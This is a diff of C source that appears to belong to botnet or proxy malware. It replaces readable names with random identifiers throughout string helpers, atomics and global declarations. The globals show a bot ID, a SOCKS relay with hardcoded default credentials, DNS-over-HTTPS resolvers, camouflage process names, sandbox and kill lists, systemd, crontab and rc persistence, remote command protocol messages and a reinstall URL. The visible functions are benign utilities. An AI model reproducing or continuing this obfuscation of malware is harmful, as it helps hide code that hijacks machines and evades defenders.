@@ -10,7 +10,7 @@ void ds_init(dstr* s) { s->buf = NULL; s->len = 0; s->cap = 0; }
 
 void ds_free(dstr* s) { free(s->buf); s->buf = NULL; s->len = 0; s->cap = 0; }
 
-static void ds_grow(dstr* s, size_t need) {
+static void _oY5qq5e(dstr* s, size_t need) {
     char *tmp;
     if (need + 1 <= s->cap) return;
     size_t nc = s->cap ? s->cap * 2 : 32;
@@ -23,14 +23,14 @@ static void ds_grow(dstr* s, size_t need) {
 
 void ds_set(dstr* s, const char* str) {
     size_t n = str ? strlen(str) : 0;
-    ds_grow(s, n);
+    _oY5qq5e(s, n);
     if (n) memcpy(s->buf, str, n);
     s->buf[n] = '\0';
     s->len = n;
 }
 
 void ds_setn(dstr* s, const char* str, size_t n) {
-    ds_grow(s, n);
+    _oY5qq5e(s, n);
     if (n) memcpy(s->buf, str, n);
     s->buf[n] = '\0';
     s->len = n;
@@ -39,7 +39,7 @@ void ds_setn(dstr* s, const char* str, size_t n) {
 void ds_cat(dstr* s, const char* str) {
     size_t n = str ? strlen(str) : 0;
     if (!n) return;
-    ds_grow(s, s->len + n);
+    _oY5qq5e(s, s->len + n);
     memcpy(s->buf + s->len, str, n);
     s->len += n;
     s->buf[s->len] = '\0';
@@ -47,14 +47,14 @@ void ds_cat(dstr* s, const char* str) {
 
 void ds_catn(dstr* s, const char* str, size_t n) {
     if (!n) return;
-    ds_grow(s, s->len + n);
+    _oY5qq5e(s, s->len + n);
     memcpy(s->buf + s->len, str, n);
     s->len += n;
     s->buf[s->len] = '\0';
 }
 
 void ds_catc(dstr* s, char c) {
-    ds_grow(s, s->len + 1);
+    _oY5qq5e(s, s->len + 1);
     s->buf[s->len++] = c;
     s->buf[s->len] = '\0';
 }
@@ -164,7 +164,7 @@ void sa_free(strarr* a) {
     a->items = NULL; a->count = 0; a->cap = 0;
 }
 
-static void sa_grow(strarr* a) {
+static void _ng4NE3d(strarr* a) {
     dstr *tmp;
     if (a->count < a->cap) return;
     size_t nc = a->cap ? a->cap * 2 : 8;
@@ -175,7 +175,7 @@ static void sa_grow(strarr* a) {
 }
 
 void sa_push(strarr* a, const char* s) {
-    sa_grow(a);
+    _ng4NE3d(a);
     ds_init(&a->items[a->count]);
     ds_set(&a->items[a->count], s);
     a->count++;
@@ -212,19 +212,19 @@ void sa_insert(strarr* dst, const strarr* src) {
    ATOMIC HELPERS (mutex-based, works on all archs)
    ====================================================================== */
 
-pthread_mutex_t g_atomic_mtx = PTHREAD_MUTEX_INITIALIZER;
+pthread_mutex_t _DC3Uh8E = PTHREAD_MUTEX_INITIALIZER;
 
 int at_load(volatile int* p) {
-    int v; pthread_mutex_lock(&g_atomic_mtx); v = *p; pthread_mutex_unlock(&g_atomic_mtx); return v;
+    int v; pthread_mutex_lock(&_DC3Uh8E); v = *p; pthread_mutex_unlock(&_DC3Uh8E); return v;
 }
 void at_store(volatile int* p, int v) {
-    pthread_mutex_lock(&g_atomic_mtx); *p = v; pthread_mutex_unlock(&g_atomic_mtx);
+    pthread_mutex_lock(&_DC3Uh8E); *p = v; pthread_mutex_unlock(&_DC3Uh8E);
 }
 int at_inc(volatile int* p) {
-    int v; pthread_mutex_lock(&g_atomic_mtx); v = ++(*p); pthread_mutex_unlock(&g_atomic_mtx); return v;
+    int v; pthread_mutex_lock(&_DC3Uh8E); v = ++(*p); pthread_mutex_unlock(&_DC3Uh8E); return v;
 }
 int at_dec(volatile int* p) {
-    int v; pthread_mutex_lock(&g_atomic_mtx); v = --(*p); pthread_mutex_unlock(&g_atomic_mtx); return v;
+    int v; pthread_mutex_lock(&_DC3Uh8E); v = --(*p); pthread_mutex_unlock(&_DC3Uh8E); return v;
 }
 
 /* ======================================================================
@@ -237,47 +237,47 @@ int g_verbose = 0;
 int g_verbose = 0;
 #endif
 
-dstr g_bot_id, g_arch, g_proc, g_origin;
-int64_t g_ram = 0;
-int     g_cpu = 0;
-double  g_uplink = 0.0;
+dstr _yg5RE4m, _dG3DF2X, _ZC6YY5F, _my4vH6P;
+int64_t _GL4jD4V = 0;
+int     _Ym3DC2v = 0;
+double  _yD4HC3W = 0.0;
 
 /* default proxy credentials — patched by setup.py */
 const char *default_proxy_user = "vision";
 const char *default_proxy_pass = "vision";
 
-dstr g_proxy_user, g_proxy_pass;
-pthread_mutex_t g_socks_creds_mtx = PTHREAD_MUTEX_INITIALIZER;
+dstr _yr2Dc6W, _uv4SZ5A;
+pthread_mutex_t _kL3Yy7R = PTHREAD_MUTEX_INITIALIZER;
 
-volatile int g_socks_active = 0, g_socks_count = 0, g_socks_stop = 0;
-dstr g_active_relay;
-pthread_mutex_t g_socks_mtx = PTHREAD_MUTEX_INITIALIZER;
-int g_socks_listener_fd = -1;
+volatile int _bS6gN5R = 0, _EE6MZ7b = 0, _bg6ay7T = 0;
+dstr _dz3vg3W;
+pthread_mutex_t _NQ8CE5p = PTHREAD_MUTEX_INITIALIZER;
+int _JN8xm6T = -1;
 
-strarr g_service_addrs;
-strarr g_doh_servers, g_doh_fallback, g_resolver_pool;
-strarr g_sys_markers, g_proc_filters, g_parent_checks;
-strarr g_camo_names;
-strarr g_sb_names, g_kill_patterns;
+strarr _zU4TP2B;
+strarr _fq5Hh7H, _GT2zC6e, _fx8Fz7F;
+strarr _ZR2yx2H, _oE2jB5C, _zR8sK4g;
+strarr _xJ8ym8N;
+strarr _Ds7cV2u, _wP7xV7q;
 
-dstr g_speed_test_url, g_dns_json_accept;
-dstr g_rc_target, g_store_dir, g_script_label, g_bin_label;
-dstr g_unit_path, g_unit_name, g_unit_body, g_tmpl_body, g_sched_expr;
-int g_ctrl_fd = -1;
-dstr g_env_label, g_cache_loc, g_lock_loc, g_heartbeat_loc;
-dstr g_proto_challenge, g_proto_success, g_proto_reg_fmt;
-dstr g_proto_ping, g_proto_pong, g_proto_out_fmt, g_proto_err_fmt;
-dstr g_proto_stdout_fmt, g_proto_stderr_fmt;
-dstr g_proto_exit_err_fmt, g_proto_exit_ok, g_proto_info_fmt;
-dstr g_msg_stream_start, g_msg_bg_start, g_msg_persist_start;
-dstr g_msg_kill_ack, g_msg_socks_err_fmt, g_msg_socks_start_fmt;
-dstr g_msg_socks_stop, g_msg_socks_auth_fmt;
-dstr g_shell_bin, g_shell_flag, g_bash_bin;
-dstr g_proc_prefix, g_cmdline_suffix;
-dstr g_pgrep_bin, g_pgrep_flag, g_dev_null_path;
-dstr g_systemctl_bin, g_crontab_bin;
-dstr g_fetch_url;
-dstr g_fetch_url_resolved;
+dstr _CT6sh3M, _so3eq8T;
+dstr _Xw5Jp4W, _UW4jD7J, _xT8zC3K, _Cs5Qb7D;
+dstr _BS3jN3L, _PZ7PR8b, _zP2mv4Y, _rM3Ck5U, _aZ2XV2A;
+int _ib2tD7y = -1;
+dstr _yj8Yv4L, _cd2pA4A, _aN8Lh6d, _ch7HN7W;
+dstr _Pi5LD4t, _KB5jb2q, _QC2kf6S;
+dstr _fp7cd2e, _gp5vZ6k, _nE6py4K, _QS4Kn2u;
+dstr _Ag2PA3Y, _sq2vi4d;
+dstr _yh8Vu8D, _VD7BQ4c, _mi6YG6d;
+dstr _KZ7LL3b, _Vm7uC8w, _HH8Az2g;
+dstr _hb6Aa4L, _zR8oC6c, _hD4fS7K;
+dstr _cJ8BU8L, _am5bJ3X;
+dstr _jy7Ho4s, _oD3KN5M, _da6QF2F;
+dstr _Ep3ej3c, _eB7YC8M;
+dstr _Uj4hP7a, _Ve2pe8n, _Qt5Ey5X;
+dstr _zu2uc2Y, _iG6pj2F;
+dstr _Xx5Rw4X;
+dstr _my6pz2j;
 dstr g_reinstall_url;
 
 /* ======================================================================
@@ -285,7 +285,7 @@ dstr g_reinstall_url;
    ====================================================================== */
 
 #ifdef DEBUG
-void debug_log(const char* fmt, ...) {
+void _nS5PJ8Y(const char* fmt, ...) {
     va_list ap;
     if (!g_verbose) return;
     va_start(ap, fmt);
